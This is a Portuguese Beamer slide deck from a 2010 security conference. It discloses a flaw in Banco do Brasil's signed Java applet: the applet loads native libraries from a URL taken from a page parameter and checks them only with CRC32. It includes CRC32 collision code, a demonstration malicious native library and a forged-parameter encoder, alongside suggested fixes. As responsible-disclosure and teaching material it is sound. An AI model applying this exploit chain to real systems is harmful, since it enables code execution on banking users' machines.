@@ -1,0 +1,1713 @@
+#LyX 1.6.7 created this file. For more info see http://www.lyx.org/
+\lyxformat 345
+\begin_document
+\begin_header
+\textclass beamer
+\begin_preamble
+\usetheme{Warsaw}
+% or ...
+
+\setbeamercovered{transparent}
+% or whatever (possibly just delete it)
+\usepackage{minted}
+\end_preamble
+\use_default_options false
+\language brazilian
+\inputencoding auto
+\font_roman times
+\font_sans default
+\font_typewriter default
+\font_default_family default
+\font_sc false
+\font_osf false
+\font_sf_scale 100
+\font_tt_scale 100
+
+\graphics default
+\paperfontsize default
+\spacing single
+\use_hyperref false
+\papersize default
+\use_geometry true
+\use_amsmath 2
+\use_esint 0
+\cite_engine basic
+\use_bibtopic false
+\paperorientation portrait
+\secnumdepth 2
+\tocdepth 2
+\paragraph_separation indent
+\defskip medskip
+\quotes_language english
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\author "" 
+\author "" 
+\end_header
+
+\begin_body
+
+\begin_layout Title
+Explorando applets Java assinadas
+\end_layout
+
+\begin_layout Subtitle
+Um estudo de caso com o módulo de segurança
+\begin_inset Newline newline
+\end_inset
+
+do Banco do Brasil
+\end_layout
+
+\begin_layout Author
+Paulo Matias
+\begin_inset Flex InstituteMark
+status open
+
+\begin_layout Plain Layout
+1
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Institute
+\begin_inset Flex InstituteMark
+status collapsed
+
+\begin_layout Plain Layout
+1
+\end_layout
+
+\end_inset
+
+Instituto de Física de São Carlos
+\begin_inset Newline newline
+\end_inset
+
+Universidade de São Paulo
+\end_layout
+
+\begin_layout Date
+H2HC - 2010
+\end_layout
+
+\begin_layout BeginFrame
+No primeiro acesso
+\end_layout
+
+\begin_layout Standard
+\align center
+O usuário se depara com a applet legítima:
+\end_layout
+
+\begin_layout Standard
+\align center
+\begin_inset Graphics
+	filename fig01-assinatura.png
+	width 100col%
+	height 60pheight%
+	keepAspectRatio
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\align center
+E aceita, afinal, ele confia em quem a publicou.
+\end_layout
+
+\begin_layout BeginFrame
+Em acessos posteriores
+\end_layout
+
+\begin_layout Standard
+\align center
+Para comodidade do usuário, a applet Java passa a ser carregada automaticamente.
+\end_layout
+
+\begin_layout Standard
+\align center
+\begin_inset Graphics
+	filename fig02-verificando.png
+	width 100col%
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\align center
+A applet e sua origem são consideradas, de fato, confiáveis.
+\end_layout
+
+\begin_layout BeginFrame
+Surge a falha
+\end_layout
+
+\begin_layout Itemize
+A assinatura garante que a applet foi empacotada pela chave legítima.
+\end_layout
+
+\begin_layout Itemize
+Mas e se fosse possível carregar código externo por meio da applet?
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+O código externo não é protegido pelos mecanismos do Java.
+\end_layout
+
+\begin_layout Itemize
+Seria possível executar código na máquina do alvo.
+\end_layout
+
+\end_deeper
+\begin_layout BeginFrame
+Como saber?
+\end_layout
+
+\begin_layout Itemize
+``Engenharia Reversa em Aplicativos Java'' - The Bug! Magazine, Edição 4.
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Nem todos esperam encontrar esse tipo de falha em códigos criados em linguagens
+ de alto nível!
+\end_layout
+
+\end_deeper
+\begin_layout Itemize
+Falha encontrada enquanto se desenvolvia uma alternativa em JavaScript para
+ acessar o BB sem o Java.
+\end_layout
+
+\begin_layout BeginFrame
+operagbas (vídeo 1)
+\end_layout
+
+\begin_layout BeginFrame
+operagbas (vídeo 2)
+\end_layout
+
+\begin_layout BeginFrame
+Voltemos à falha
+\end_layout
+
+\begin_layout Itemize
+A falha, nesta applet, dependia de três pontos distintos para ser explorada:
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Ausência de validação de contexto.
+\end_layout
+
+\begin_layout Itemize
+Dependência de parâmetros externos.
+\end_layout
+
+\begin_layout Itemize
+Validação fraca da biblioteca de código nativo.
+\end_layout
+
+\end_deeper
+\begin_layout BeginFrame
+Ausência de validação de contexto
+\end_layout
+
+\begin_layout Itemize
+O mecanismo de autorização do Java não verifica onde a applet é usada.
+\end_layout
+
+\begin_layout Itemize
+Verificá-lo pode ser uma medida proativa interessante.
+\end_layout
+
+\begin_layout EndFrame
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+definecolor{bg}{rgb}{0.95,0.95,0.95} 
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Validar o contexto (sugestão)}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{java}
+\end_layout
+
+\begin_layout Plain Layout
+
+public class GbAs extends JApplet implements Observer {
+\end_layout
+
+\begin_layout Plain Layout
+
+  public void init() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+    String expectedCodeBase = "https://www2.bancobrasil.com.br/aapf/idh";
+\end_layout
+
+\begin_layout Plain Layout
+
+    String expectedDocBase  = "https://www2.bancobrasil.com.br/aapf";
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(getCodeBase().toString().startsWith(expectedCodeBase) &&
+\end_layout
+
+\begin_layout Plain Layout
+
+       getDocumentBase().toString().startsWith(expectedDocBase)) {
+\end_layout
+
+\begin_layout Plain Layout
+
+      /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    else {
+\end_layout
+
+\begin_layout Plain Layout
+
+      this.f.set(5);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    super.init();
+\end_layout
+
+\begin_layout Plain Layout
+
+  }
+\end_layout
+
+\begin_layout Plain Layout
+
+  /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Dependência de parâmetros externos}
+\end_layout
+
+\begin_layout Plain Layout
+
+A applet recebia os seguintes parâmetros a partir do HTML:
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{html}
+\end_layout
+
+\begin_layout Plain Layout
+
+<applet id="jmid" name="jmid" archive="/aapf/idh/GbAs.jar" code="br/com/gas/mid/G
+bAs.class"
+\end_layout
+
+\begin_layout Plain Layout
+
+ height="1" width="1" MAYSCRIPT>
+\end_layout
+
+\begin_layout Plain Layout
+
+    <param value="eNoNy8lygjAAANDf6QwHWQKUQw+AIEogLBGIlw4Eym5MZan9+vbdnyAHb59y64
+EC5T/heNXugZr
+\end_layout
+
+\begin_layout Plain Layout
+
+pazaPtSPmFTgxXTCI1UIX9vrvxUR5OkWzM1B3HxzsmHuTnrnmU7cZ+psT8m5dPcL47XAUz9ojCmpRHU5
+LQOFSw8zvumIx
+\end_layout
+
+\begin_layout Plain Layout
+
+UjRrF2etFXTAeGDxg2i6TVXabfx/1Ca+Jt6XFOZltIHWvu4GLu/IWkWpnftMShE0p+cLbLyKbH6/fNsV
+6jh4GXbImp7Wy
+\end_layout
+
+\begin_layout Plain Layout
+
+jFyCWJCc1QaAYxtQtic4C2FJYnxWDB1Iq7ynhehW7IJxUyMwdOfBlO2zJhKC9zPH38QqFtN"
+ name="seed" />
+\end_layout
+
+\begin_layout Plain Layout
+
+    <param name="statusChangeCallback" value="checkApplet"/>
+\end_layout
+
+\begin_layout Plain Layout
+
+</applet> 
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+Após decodificados:
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+small]{javascript}
+\end_layout
+
+\begin_layout Plain Layout
+
+{ GBAS17: 'BB'
+\end_layout
+
+\begin_layout Plain Layout
+
+, GBAS16: 'https://www2.bancobrasil.com.br/aapf/idh/'
+\end_layout
+
+\begin_layout Plain Layout
+
+, GBAS10: '2009-Sep-08 12:05:23'
+\end_layout
+
+\begin_layout Plain Layout
+
+, GBAS11: 'bd1242d85c5abdc6d833f8f0c82a4697'
+\end_layout
+
+\begin_layout Plain Layout
+
+, GBAS18: 'https://www14.bancobrasil.com.br/update/rld/'
+\end_layout
+
+\begin_layout Plain Layout
+
+, GTSTR_GBAS23: '61'
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Dependência de parâmetros externos}
+\end_layout
+
+\begin_layout Plain Layout
+
+O parâmetro 
+\backslash
+texttt{GBAS16} era utilizado no seguinte código:
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{java}
+\end_layout
+
+\begin_layout Plain Layout
+
+public class LibraryManager {
+\end_layout
+
+\begin_layout Plain Layout
+
+  public String downloadLibrary(String options) {
+\end_layout
+
+\begin_layout Plain Layout
+
+    String url;
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!(url = OptionManager.splitString(options, "GBAS16=")).endsWith("/"))
+ {
+\end_layout
+
+\begin_layout Plain Layout
+
+      url = url + '/';
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    url = url + getLibraryName();
+\end_layout
+
+\begin_layout Plain Layout
+
+    String path = getLibraryPath();
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!validateLocalLibraryChecksum()) {
+\end_layout
+
+\begin_layout Plain Layout
+
+      (new Download()).download(url, path);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    return path;
+\end_layout
+
+\begin_layout Plain Layout
+
+  }
+\end_layout
+
+\begin_layout Plain Layout
+
+  /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Utilizar uma url definida na compilação (sugestão)}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+small]{java}
+\end_layout
+
+\begin_layout Plain Layout
+
+public class LibraryManager {
+\end_layout
+
+\begin_layout Plain Layout
+
+  public String downloadLibrary(String options) {
+\end_layout
+
+\begin_layout Plain Layout
+
+    String url =
+\end_layout
+
+\begin_layout Plain Layout
+
+        "https://www2.bancobrasil.com.br/aapf/idh/" +
+\end_layout
+
+\begin_layout Plain Layout
+
+        getLibraryName();
+\end_layout
+
+\begin_layout Plain Layout
+
+    String path = getLibraryPath();
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!validateLocalLibraryChecksum()) {
+\end_layout
+
+\begin_layout Plain Layout
+
+      (new Download()).download(url, path);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    return path;
+\end_layout
+
+\begin_layout Plain Layout
+
+  }
+\end_layout
+
+\begin_layout Plain Layout
+
+  /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Validação fraca da biblioteca de código nativo}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{itemize}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+item Era utilizado um checksum baseado no CRC32 (fácil colisão).
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+item Checksums disponíveis em 
+\backslash
+texttt{br/com/gas/mid/gbasfiles.chk}:
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{itemize}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt]{ini}
+\end_layout
+
+\begin_layout Plain Layout
+
+GBAS_SO_HASH=g8gAgt8QE0Dolbiyiyc=
+\end_layout
+
+\begin_layout Plain Layout
+
+GBAS_DYLIB_HASH=g8gAgtsVE0hK8XUyvn7j
+\end_layout
+
+\begin_layout Plain Layout
+
+GBAS_DLL_HASH=g8gAgtgVE0rn5r/xnltS 
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Colidindo um checksum do tipo CRC32}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Método baseado em 
+\begin_inset Flex URL
+status open
+
+\begin_layout Plain Layout
+
+http://www.woodmann.com/fravia/crctut1.htm
+\end_layout
+
+\end_inset
+
+:
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{javascript}
+\end_layout
+
+\begin_layout Plain Layout
+
+RevCk.init = function() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    this.rev = {};
+\end_layout
+
+\begin_layout Plain Layout
+
+    for(var i = 0; i < this.tbl.length; i++) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        var topByte = (RevCk.tbl[i] >>> 24) & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+        this.rev[topByte] = i;
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+};
+\end_layout
+
+\begin_layout Plain Layout
+
+RevCk.calc = function(current, wanted) {
+\end_layout
+
+\begin_layout Plain Layout
+
+    current ^= 0xffffffff;
+\end_layout
+
+\begin_layout Plain Layout
+
+    wanted  ^= 0xffffffff;
+\end_layout
+
+\begin_layout Plain Layout
+
+    var buf = [0, 0, 0, 0, 0, 0, 0, 0];
+\end_layout
+
+\begin_layout Plain Layout
+
+    var xor4 = function(i, value) {  // little-endian
+\end_layout
+
+\begin_layout Plain Layout
+
+       buf[i+0] ^= (value >>>  0) & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+       buf[i+1] ^= (value >>>  8) & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+       buf[i+2] ^= (value >>> 16) & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+       buf[i+3] ^= (value >>> 24) & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+    };
+\end_layout
+
+\begin_layout Plain Layout
+
+    xor4(0, current);
+\end_layout
+
+\begin_layout Plain Layout
+
+    xor4(4,  wanted);
+\end_layout
+
+\begin_layout Plain Layout
+
+    for(var i = 4; i > 0; i--) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        var entryNum = this.rev[buf[i+3]];
+\end_layout
+
+\begin_layout Plain Layout
+
+        var entryVal = this.tbl[entryNum];
+\end_layout
+
+\begin_layout Plain Layout
+
+        xor4(i, entryVal);
+\end_layout
+
+\begin_layout Plain Layout
+
+        buf[i-1] ^= entryNum;
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    return buf.slice(0, 4);
+\end_layout
+
+\begin_layout Plain Layout
+
+};
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Utilizar um hash mais forte (sugestão)}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{java}
+\end_layout
+
+\begin_layout Plain Layout
+
+public class LibraryManager {
+\end_layout
+
+\begin_layout Plain Layout
+
+  public boolean validateLocalLibraryChecksum() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    String hash = ""; 
+\end_layout
+
+\begin_layout Plain Layout
+
+    String correctHash = a();
+\end_layout
+
+\begin_layout Plain Layout
+
+    String path = getLibraryPath();
+\end_layout
+
+\begin_layout Plain Layout
+
+    File file = new File(path);
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(correctHash == "")
+\end_layout
+
+\begin_layout Plain Layout
+
+      return 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!file.exists() || (file.length() == 0))
+\end_layout
+
+\begin_layout Plain Layout
+
+      return 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+    try {
+\end_layout
+
+\begin_layout Plain Layout
+
+      DigestInputStream stream = 
+\end_layout
+
+\begin_layout Plain Layout
+
+        new DigestInputStream(
+\end_layout
+
+\begin_layout Plain Layout
+
+          new FileInputStream(file),
+\end_layout
+
+\begin_layout Plain Layout
+
+          MessageDigest.getInstance("SHA-256")
+\end_layout
+
+\begin_layout Plain Layout
+
+        );
+\end_layout
+
+\begin_layout Plain Layout
+
+      while(stream.read() != -1);
+\end_layout
+
+\begin_layout Plain Layout
+
+      StringBuilder sBuilder = new StringBuilder();
+\end_layout
+
+\begin_layout Plain Layout
+
+      for(byte b : stream.getMessageDigest().digest()) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        sBuilder.append(Character.forDigit((b>>4) & 0xf, 16));
+\end_layout
+
+\begin_layout Plain Layout
+
+        sBuilder.append(Character.forDigit((b   ) & 0xf, 16));
+\end_layout
+
+\begin_layout Plain Layout
+
+      }
+\end_layout
+
+\begin_layout Plain Layout
+
+      hash = sBuilder.toString();
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    catch(IOException e) {
+\end_layout
+
+\begin_layout Plain Layout
+
+      return 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    catch(NoSuchAlgorithmException e) {
+\end_layout
+
+\begin_layout Plain Layout
+
+      return 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    return (hash == correctHash);
+\end_layout
+
+\begin_layout Plain Layout
+
+  }
+\end_layout
+
+\begin_layout Plain Layout
+
+  /* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout BeginFrame
+Funcionamento do exploit
+\end_layout
+
+\begin_layout Standard
+Para explorar a falha, é necessário:
+\end_layout
+
+\begin_layout Itemize
+Criar bibliotecas nativas (
+\family typewriter
+.so
+\family default
+, 
+\family typewriter
+.dll
+\family default
+, 
+\family typewriter
+.dylib
+\family default
+) com código malicioso.
+\end_layout
+
+\begin_layout Itemize
+Gerar um arquivo que colida com o checksum verificado pela applet.
+\end_layout
+
+\begin_layout Itemize
+Gerar uma string de parâmetros forjada.
+\end_layout
+
+\begin_layout EndFrame
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Código da biblioteca nativa}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+tiny]{c}
+\end_layout
+
+\begin_layout Plain Layout
+
+static void do_exploit() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    const char *msg = "Parabens! Voce acabou de ser afetado"
+\end_layout
+
+\begin_layout Plain Layout
+
+                      "por um exploit de demonstracao do H2HC 2010.";
+\end_layout
+
+\begin_layout Plain Layout
+
+    const char *basename = "VOCE_FOI_EXPLOITADO.txt";
+\end_layout
+
+\begin_layout Plain Layout
+
+    const char *homedir = getenv("HOME");
+\end_layout
+
+\begin_layout Plain Layout
+
+    char filename[256];
+\end_layout
+
+\begin_layout Plain Layout
+
+    FILE *fp;
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(homedir)
+\end_layout
+
+\begin_layout Plain Layout
+
+        snprintf(filename, sizeof(filename), "%s/%s", homedir, basename);
+\end_layout
+
+\begin_layout Plain Layout
+
+    else
+\end_layout
+
+\begin_layout Plain Layout
+
+        strncpy(filename, basename, sizeof(filename));
+\end_layout
+
+\begin_layout Plain Layout
+
+    if((fp = fopen(filename, "w"))) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        fwrite(msg, strlen(msg), 1, fp);
+\end_layout
+
+\begin_layout Plain Layout
+
+        fclose(fp);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!fork()) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        execlp("gedit", "gedit", filename, NULL);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    if(!fork()) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        execlp("xterm", "xterm", "-e", "less", filename, NULL);
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+/* ...
+ */
+\end_layout
+
+\begin_layout Plain Layout
+
+JNIEXPORT jstring JNICALL
+\end_layout
+
+\begin_layout Plain Layout
+
+Java_br_com_gas_mid_entity_CLibrary_getVersion(JNIEnv *env, jobject obj)
+ {
+\end_layout
+
+\begin_layout Plain Layout
+
+    return exploit_and_return_jstring(env, "1.3.3.7");
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Colisão do checksum}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+small]{javascript}
+\end_layout
+
+\begin_layout Plain Layout
+
+    var data = Base64.arrayifyString(fs.readFileSync(
+\end_layout
+
+\begin_layout Plain Layout
+
+srcfile, 'binary'));
+\end_layout
+
+\begin_layout Plain Layout
+
+    var curCkSum = CkSum.getValue(data);
+\end_layout
+
+\begin_layout Plain Layout
+
+    sys.puts('Calculated checksum: '+curCkSum);
+\end_layout
+
+\begin_layout Plain Layout
+
+    
+\end_layout
+
+\begin_layout Plain Layout
+
+    var revBytes = RevCk.calc(curCkSum, expectedCkSum);
+\end_layout
+
+\begin_layout Plain Layout
+
+    sys.puts('RevCk: ' + sys.inspect(revBytes.map(hex)));
+\end_layout
+
+\begin_layout Plain Layout
+
+    
+\end_layout
+
+\begin_layout Plain Layout
+
+    var data = fs.readFileSync(srcfile);
+\end_layout
+
+\begin_layout Plain Layout
+
+    var revBytes = new Buffer(revBytes);
+\end_layout
+
+\begin_layout Plain Layout
+
+    var fd = fs.openSync(destfile, 'w');
+\end_layout
+
+\begin_layout Plain Layout
+
+    fs.writeSync(fd, data, 0, data.length);
+\end_layout
+
+\begin_layout Plain Layout
+
+    fs.writeSync(fd, revBytes, 0, revBytes.length);
+\end_layout
+
+\begin_layout Plain Layout
+
+    fs.closeSync(fd);
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{frame}[fragile]{Geração da string de parâmetros}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=
+\backslash
+small]{javascript}
+\end_layout
+
+\begin_layout Plain Layout
+
+function encodeParams(params, f) {
+\end_layout
+
+\begin_layout Plain Layout
+
+    var plainText = '';
+\end_layout
+
+\begin_layout Plain Layout
+
+    for(var key in params) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        plainText += key + '=' + params[key] + '|';
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    plainText = plainText.substr(0, plainText.length-1);
+\end_layout
+
+\begin_layout Plain Layout
+
+    var partialKey = 'aBcDeFgH';
+\end_layout
+
+\begin_layout Plain Layout
+
+    var key =Base64.arrayifyString(partialKey+'!#$%&*)');
+\end_layout
+
+\begin_layout Plain Layout
+
+    var cipherText = Encripta(plainText, key);
+\end_layout
+
+\begin_layout Plain Layout
+
+    var result = partialKey + cipherText;
+\end_layout
+
+\begin_layout Plain Layout
+
+    require('child_process').exec('python -c  
+\backslash
+'import
+\end_layout
+
+\begin_layout Plain Layout
+
+base64,zlib;print(base64.b64encode(zlib.compress("'+
+\end_layout
+
+\begin_layout Plain Layout
+
+result+'")))
+\backslash
+'', function(err, stdout, stderr) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        f(stdout);
+\end_layout
+
+\begin_layout Plain Layout
+
+    });
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{minted}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{frame}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout BeginFrame
+Demonstração do exploit
+\end_layout
+
+\begin_layout BeginFrame
+Conclusão e agradecimentos
+\end_layout
+
+\begin_layout Itemize
+Falha relativamente simples de entender, porém de consequências amplas.
+\end_layout
+
+\begin_layout Itemize
+Espera-se incentivar mais pesquisa neste tipo de falha.
+\end_layout
+
+\begin_layout Itemize
+Agradecemos ao CSIRT do Banco do Brasil pela recepção atenciosa do relatório
+ e pela seriedade com a qual lidaram com a questão.
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Agradecimentos especiais a Fernando A.
+ Higa.
+\end_layout
+
+\end_deeper
+\begin_layout EndFrame
+
+\end_layout
+
+\end_body
+\end_document
